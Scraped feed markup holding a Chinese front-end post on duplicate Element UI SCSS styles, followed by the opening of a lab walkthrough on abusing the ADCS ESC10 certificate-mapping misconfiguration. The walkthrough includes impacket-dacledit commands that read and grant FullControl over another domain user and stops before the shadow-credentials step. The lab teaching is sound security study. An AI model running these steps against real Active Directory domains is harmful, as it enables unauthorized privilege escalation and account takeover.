                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">情况</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7c241748cee245d59594d7075869f9fb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6a2C56WI5qKm:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765620165&amp;x-signature=e6hJC9ZpGc%2Fi2sDlAF%2FyQEfcaV8%3D" alt="image.png" loading="lazy"/></p>
<p>点进去，是一个style标签，里面有六万多行样式
进去使用正则查找，发现有11处一模一样的样式</p>
<pre><code class="hljs">^.el-textarea__inner \{
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/899218169b8d47faac862689bd841e95~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6a2C56WI5qKm:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765620165&amp;x-signature=Gbe5Rrk1ro%2FMuLdMCY00i1uBcTo%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-1">过程</h2>
<p>经过简单排查，发现问题在于<code>element-variables.scss</code>这个文件中，我框选的这一条代码。<br/>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/59cf607abdd344d2985114c5e566d707~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6a2C56WI5qKm:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765620165&amp;x-signature=e%2Fe7mIcoMgM7wIanuILh26fv9F8%3D" alt="image.png" loading="lazy"/></p>
<p>但是把它注释掉，样式就没了，因为项目引入样式的方式是scss。<br/>
于是乎去查看官方文档，确实没啥问题。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b008a6fbbda54bccb2783c9a0a0b1802~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6a2C56WI5qKm:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765620165&amp;x-signature=KhnYQA07flfnPIq2V5NWsxPqYY0%3D" alt="image.png" loading="lazy"/></p>
<p>于是我起了一个新的vue2+element-ui+scss项目，用同样的方式引入。<br/>
结果发现，是一样的，也有重复的样式说明这是Element的问题。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/82adb4ad07ae4a428e8800254ab879bc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6a2C56WI5qKm:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765620165&amp;x-signature=DidleNd%2BUfWCnJntyTLrW72fxao%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-2">原因</h2>
<p>element官方的scss文件中重复定义了样式
比如我引入以下样式
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a7106d24d8cd4aad9c86767251b32119~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6a2C56WI5qKm:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765620165&amp;x-signature=BuS66YQ98vlLIgylUPtySa3uPn0%3D" alt="image.png" loading="lazy"/>
可以发现有两个重复样式</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6f639a76f2f5451aab4a717133a93e31~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6a2C56WI5qKm:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765620165&amp;x-signature=QFu0oOJUUcxhZDtr8a893xMKuB0%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-3">解决方法</h2>
<p>Element早已停更，假如你不是迫不得已，应该停止使用这个UI库。<br/>
以下的所有方法都并不是一种优雅的解决方式，但是他们可以解决当前的问题。<br/>
解决方法来自github，但是位于以下文章的引用让我发现这个问题。<br/>
[vue.js - ElementUI重复引入样式问题 - 学习前端历程 - SegmentFault 思否]  (<a href="https://link.juejin.cn?target=https%3A%2F%2Fsegmentfault.com%2Fa%2F1190000022495821" target="_blank" title="https://segmentfault.com/a/1190000022495821" ref="nofollow noopener noreferrer">segmentfault.com/a/119000002…</a>)<br/>
令人遗憾的是，这篇文章里的方法根本不起作用。</p>
<h3 data-id="heading-4">postcss的cssnano(推荐)</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FElemeFE%2Felement%2Fissues%2F11817%23issuecomment-588127007" target="_blank" title="https://github.com/ElemeFE/element/issues/11817#issuecomment-588127007" ref="nofollow noopener noreferrer">github.com/ElemeFE/ele…</a><br/>
你只需要创建<code>postcss.config.js</code>文件，添加<code>cssnano: {}</code>即可去掉重复的样式。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// postcss.config.js</span>
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
  <span class="hljs-attr">plugins</span>: {
    <span class="hljs-attr">autoprefixer</span>: {},
    <span class="hljs-attr">cssnano</span>: {}
  },
};
</code></pre>
<h3 data-id="heading-5">编译出css避开问题(不推荐)</h3>
<p>假如我要新加一个scss变量呢？<br/>
不推荐这种削足适履的方式</p>
<blockquote>
<p>我没有尝试这种方式，但这种方式在原理上是可行的，因为他完全避开了问题，当使用css文件时，就不会编译，自然也就不会引发重复样式的问题。</p>
</blockquote>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FElemeFE%2Felement%2Fissues%2F11817%23issuecomment-706243188" target="_blank" title="https://github.com/ElemeFE/element/issues/11817#issuecomment-706243188" ref="nofollow noopener noreferrer">github.com/ElemeFE/ele…</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FElemeFE%2Felement%2Fissues%2F11817%23issuecomment-2789581274" target="_blank" title="https://github.com/ElemeFE/element/issues/11817#issuecomment-2789581274" ref="nofollow noopener noreferrer">github.com/ElemeFE/ele…</a></p>
<h3 data-id="heading-6">fast-sass-loader(不推荐)</h3>
<blockquote>
<p>更换依赖为项目引入了额外的复杂性，所以这并不是推荐的方法</p>
</blockquote>
<p>核心在于chainWebpack的配置，代码来自如下链接。<br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fyibn2008%2Ffast-sass-loader%2Fissues%2F50%23issuecomment-468605882" target="_blank" title="https://github.com/yibn2008/fast-sass-loader/issues/50#issuecomment-468605882" ref="nofollow noopener noreferrer">github.com/yibn2008/fa…</a><br/>
忽略下面的注释，这是我之前做的尝试。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> { defineConfig } = <span class="hljs-built_in">require</span>(<span class="hljs-string">'@vue/cli-service'</span>)
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">transpileDependencies</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">chainWebpack</span>: <span class="hljs-function">(<span class="hljs-params">config</span>) =&gt;</span> {
    config.<span class="hljs-property">module</span>.<span class="hljs-property">rules</span>.<span class="hljs-title function_">delete</span>(<span class="hljs-string">'scss'</span>)

    <span class="hljs-keyword">let</span> scssRule = config.<span class="hljs-property">module</span>.<span class="hljs-title function_">rule</span>(<span class="hljs-string">'scss'</span>)
      .<span class="hljs-title function_">test</span>(<span class="hljs-regexp">/\.scss$/</span>);

    [
      { <span class="hljs-attr">name</span>: <span class="hljs-string">'vue-style-loader'</span> },
      { <span class="hljs-attr">name</span>: <span class="hljs-string">'css-loader'</span> },
      { <span class="hljs-attr">name</span>: <span class="hljs-string">'postcss-loader'</span> },
      { <span class="hljs-attr">name</span>: <span class="hljs-string">'fast-sass-loader'</span> }
    ].<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">load</span>) =&gt;</span> {
      scssRule
        .<span class="hljs-title function_">use</span>(load.<span class="hljs-property">name</span>)
        .<span class="hljs-title function_">loader</span>(load.<span class="hljs-property">loader</span> || load.<span class="hljs-property">name</span>)
        .<span class="hljs-title function_">options</span>(load.<span class="hljs-property">options</span> || {})
    })
  },
  <span class="hljs-comment">// configureWebpack: {</span>
  <span class="hljs-comment">//   module: {</span>
  <span class="hljs-comment">//     rules: [</span>
  <span class="hljs-comment">//       {</span>
  <span class="hljs-comment">//         test: /\.(scss|sass)$/,</span>
  <span class="hljs-comment">//         use: [</span>
  <span class="hljs-comment">//           'css-loader',</span>
  <span class="hljs-comment">//           {</span>
  <span class="hljs-comment">//             loader: 'fast-sass-loader',</span>
  <span class="hljs-comment">//             options: {</span>
  <span class="hljs-comment">//               // includePaths: [... ]</span>
  <span class="hljs-comment">//             }</span>
  <span class="hljs-comment">//           }</span>
  <span class="hljs-comment">//         ]</span>
  <span class="hljs-comment">//       },</span>
  <span class="hljs-comment">//       // other loaders ...</span>
  <span class="hljs-comment">//     ]</span>
  <span class="hljs-comment">//   }</span>
  <span class="hljs-comment">// }</span>
})

</code></pre>
<p>fast-sass-loader解决了这个问题，但是官方并没有给出vue-cli中的合理使用方式。<br/>
我找了很久如何在vue中使用这个东西。<br/>
当我直接修改vue中的webpack配置，卸载了<code>sass-loader</code>，完全没有作用。<br/>
包括github issue中有部分人也尝试使用这个工具，他们的配置也失败了，说明这不是个例。<br/>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/89a0413334af468c9543c42e67a58565~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6a2C56WI5qKm:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765620165&amp;x-signature=O%2FAOPQQK73JMDf%2BUifgnidrcbuk%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li>不支持<code>~@</code>别名</li>
</ul>

<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Syntax</span> <span class="hljs-title class_">Error</span>: <span class="hljs-title class_">Error</span>: <span class="hljs-keyword">import</span> file cannot be <span class="hljs-attr">resolved</span>: <span class="hljs-string">"@import "</span>~@/assets/styles/mixin.<span class="hljs-property">scss</span><span class="hljs-string">";"</span>
</code></pre>
<ul>
<li>4年未更新，基本可以认为弃坑</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e4fa319c245648e583cb43555e49fd2b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6a2C56WI5qKm:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765620165&amp;x-signature=rWpKiLc8GGbuSepVR5nieK1aK1M%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/581617e087d147979ed39da94c0d24e3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6a2C56WI5qKm:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765620165&amp;x-signature=X5zxiohZIoAK2OA80rGB2vTB6Jg%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li>不支持source Map</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ff0db70f46b54759832e7b35924de9f7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6a2C56WI5qKm:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765620165&amp;x-signature=WIir37zMPi3rV8EN8jU7VHuY0gA%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-7">总结</h2>
<p>如果可以，我真不想用vue2和element。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[滥用ESC10：通过注册表配置不当实现权限提升的ADCS攻击分析]]></title>    <link>https://juejin.cn/post/7580280096059621403</link>    <guid>https://juejin.cn/post/7580280096059621403</guid>    <pubDate>2025-12-06T09:44:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580280096059621403" data-draft-id="7580280096059605019" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="滥用ESC10：通过注册表配置不当实现权限提升的ADCS攻击分析"/> <meta itemprop="keywords" content="人工智能,AIGC"/> <meta itemprop="datePublished" content="2025-12-06T09:44:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="qife122"/> <meta itemprop="url" content="https://juejin.cn/user/1743174852185579"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            滥用ESC10：通过注册表配置不当实现权限提升的ADCS攻击分析
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1743174852185579/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    qife122
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-06T09:44:52.000Z" title="Sat Dec 06 2025 09:44:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读12分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ADCS攻击系列：滥用ESC10通过注册表配置不当实现权限提升</h2>
<p><em>Active Directory Certificate Services (ADCS) 负责在AD环境中颁发和管理数字证书。这些证书用于加密和验证用户身份等用途。</em></p>
<p>与AD的许多组件一样，ADCS也有其自身漏洞，攻击者可利用这些漏洞进行权限提升和域控制。这些弱点使用“ESC”前缀后跟数字（如ESC1、ESC2等）来引用特定的错误配置。</p>
<p>在这个ADCS系列中，我将一次分解一种错误配置，采用实用、逐步推进的方法。今天，我们将探讨ESC10，它涉及弱化证书映射的错误注册表设置。</p>
<p>在本文的演练中，我将使用HTB学院的“ADCS攻击模块”作为实验环境。</p>
<h3 data-id="heading-1">目录</h3>
<ul>
<li>理解ESC10
<ul>
<li>StrongCertificateBindingEnforcement (Kerberos映射)</li>
<li>CertificateMappingMethods (Schannel映射)</li>
</ul>
</li>
<li>ESC10要求</li>
<li>所需工具</li>
<li>滥用ESC10
<ul>
<li>Kerberos映射</li>
<li>Schannel映射</li>
</ul>
</li>
<li>缓解措施</li>
<li>资源</li>
</ul>
<h3 data-id="heading-2">理解ESC10</h3>
<p>ESC10建立在ESC9之上，因为它也与证书映射问题相关，但这次问题源于决定证书如何映射到用户的注册表设置配置错误。</p>
<p>在之前的文章《ADCS攻击系列：滥用ESC9通过弱证书映射实现权限提升》中，我们了解了证书映射在Active Directory中的工作原理。AD通过检查证书中的用户主体名称 (UPN)、使用者可选名称 (SAN) 甚至嵌入的 objectSid 等字段来验证证书所有权。</p>
<p>从2023年的KB5014754开始，Microsoft开始强制执行更严格的验证检查以强化此过程。这些控制依赖于两个主要的注册表键：</p>
<ul>
<li><code>StrongCertificateBindingEnforcement</code></li>
<li><code>CertificateMappingMethods</code></li>
</ul>
<h4 data-id="heading-3">StrongCertificateBindingEnforcement (Kerberos映射)</h4>
<p>此注册表键定义了域控制器在Kerberos身份验证期间验证证书的严格程度：</p>
<ul>
<li><strong>禁用模式 (0)</strong>：无强验证检查。</li>
<li><strong>兼容模式 (1)</strong>：进行了一些检查，但如果账户在证书颁发前就已存在，证书仍可能有效。</li>
<li><strong>完全强制执行 (2)</strong>：严格的验证检查，如果映射不匹配，则身份验证失败。</li>
</ul>
<h4 data-id="heading-4">CertificateMappingMethods (Schannel映射)</h4>
<p>此注册表键定义了如何通过Schannel协议（如LDAPS）映射证书。它接受位标志：</p>
<ul>
<li><code>0x01</code>: 使用者/颁发者</li>
<li><code>0x02</code>: 仅颁发者</li>
<li><code>0x04</code>: 用户主体名称 (UPN)</li>
<li><code>0x08</code>: S4U2Self</li>
<li><code>0x10</code>: S4U2Self explicit</li>
</ul>
<p>如果启用了UPN映射位 <code>0x04</code> 并且我们控制了一个用户，我们只需将其UPN更改为 administrator。然后，当我们请求带有该UPN的证书时，Active Directory会错误地将其映射到实际的 Administrator 账户。</p>
<h3 data-id="heading-5">ESC10要求</h3>
<p>由于ESC10涉及注册表配置错误，而非模板配置错误，我们无法以低权限用户的身份可靠地识别它。没有域管理员权限，我们无法读取DC的注册表。</p>
<p>这意味着发现过程通常是试错式的，我们尝试流程并观察什么能成功。以下是需要检查的内容：</p>
<ul>
<li>控制一个具有诸如 GenericWrite、WriteOwner 或 WriteDACL 等权限的用户或计算机账户。</li>
<li>任何允许客户端身份验证的证书模板，检查内置的“用户”模板（如果启用）。</li>
<li>要滥用Kerberos映射，需要将 <code>StrongCertificateBindingEnforcement</code> 设置为0——这很罕见，因为Microsoft正在推动默认情况下，当该键未设置时强制执行完全强制执行(2)。（参见下面的说明）。</li>
<li>要滥用Schannel映射，需要使 <code>CertificateMappingMethods</code> 启用 <code>0x04</code> UPN映射，默认情况下此标志是禁用的——同样，在现代环境中也不再常见。</li>
</ul>
<p>📌 <strong>注意</strong>：2025年9月更新后，该键将不再有效。所有DC都将强制执行完全强制执行(2)，无法回滚。（来源：KB5014754）</p>
<h3 data-id="heading-6">所需工具</h3>
<p><strong>Linux</strong>：Certipy, Impacket, NetExec</p>
<h3 data-id="heading-7">滥用ESC10</h3>
<p>利用ESC10取决于身份验证通道是“Kerberos还是Schannel”，以及我们目标是用户账户还是计算机账户。总体流程类似于我们在ESC9文章中介绍的内容。</p>
<h4 data-id="heading-8">Kerberos映射</h4>
<p>当 <code>StrongCertificateBindingEnforcement</code> 设置为0时，KDC会跳过所有强绑定检查，包括基于证书的Kerberos登录期间的 objectSid。</p>
<p>这使得映射变得宽松，允许我们更改UPN并伪装成任何域用户，例如将其设置为 <code>administrator@local.lab</code>，并让KDC接受该证书作为该账户。</p>
<p>由于这是Kerberos身份验证，成功的证书登录将为我们提供目标账户（该用户）或域内计算机的TGT。</p>
<h5 data-id="heading-9">1. 识别我们可以控制的用户</h5>
<p>首先，我们需要找到一个我们可以控制的用户账户，一个我们拥有如 GenericWrite、WriteDACL 或 GenericAll 等权限的账户，这些权限允许我们修改诸如UPN等属性。</p>
<p>拥有 GenericWrite，我们可以重置用户的密码并访问该账户。WriteDACL则更进一步，允许我们编辑用户的DACL以授予自己完全控制权。而有了 GenericAll，我们已经拥有对该对象的完全控制。</p>
<p>我们可以使用BloodHound查找拥有这些权限的用户。我们当前的用户是 blwasp，所以我们将在BloodHound中查找“Outbound Object Control”权限。</p>
<p>如下图所示，blwasp 对多个用户拥有 GenericAll 权限。我们将继续使用 james 进行此攻击。</p>
<p>blwasp用户拥有对 james 的 GenericAll 权限。</p>
<h5 data-id="heading-10">2. 验证我们对用户的权限</h5>
<p>我们可以使用Impacket的 <code>dacledit</code> 模块来确认我们对目标用户 james 的访问权限。</p>
<pre><code class="hljs language-bash" lang="bash">impacket-dacledit -action <span class="hljs-built_in">read</span> -dc-ip 10.129.228.236 lab.local/blwasp:<span class="hljs-string">'Password123!'</span> -principal blwasp -target james
</code></pre>
<p>如输出所示，blwasp 对 james 拥有“FullControl”权限，确认我们可以继续修改其属性。</p>
<p>如果仅对目标用户拥有 WriteOwner 或 WriteDACL 权限，则需要首先修改DACL以授予自己 FullControl。这也可以使用 <code>dacledit</code> 完成。以下命令授予当前用户对目标用户对象（james）的完全控制权限。</p>
<pre><code class="hljs language-bash" lang="bash">impacket-dacledit -action write -rights <span class="hljs-string">'FullControl'</span> -principal blwasp -target james -dc-ip 10.129.228.236 lab.local/blwasp:<span class="hljs-string">'Password123!'</span>
</code></pre>
<p>为当前用户授予对目标用户的完全控制权限。</p>
<h5 data-id="heading-11">3. 获取目标用户凭据</h5>
<p>拥有对目标用户 james 的完全控制权后，我们有几个选择。我们可以重置其密码，或者使用影子凭据 (Shadow Credentials) 添加额外的凭据。</p>
<p>为了与现实场景保持一致，即我们希望避免重置用户密码并造成操作中断，我们将采用影子凭据方法。</p>
